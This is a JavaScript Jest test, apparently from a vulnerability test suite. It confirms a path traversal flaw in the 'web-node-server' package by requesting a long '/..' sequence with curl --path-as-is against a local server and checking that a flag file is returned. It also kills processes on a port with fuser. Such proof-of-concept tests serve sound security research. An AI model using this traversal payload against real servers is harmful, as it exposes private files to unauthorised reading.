var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 8981/tcp");
  } catch (e) {}
});
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in web-node-server", (done) => {
  expect.assertions(1);
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8981/tcp", () => {});
  } catch (e) {}
  let config = {
    localhost: {
      backend: __dirname + "/",
      frondend: __dirname + "/",
      baseTemp: "index.html",
    },
  };
  const pkg = require("web-node-server");
  pkg.start(config);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:9999${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
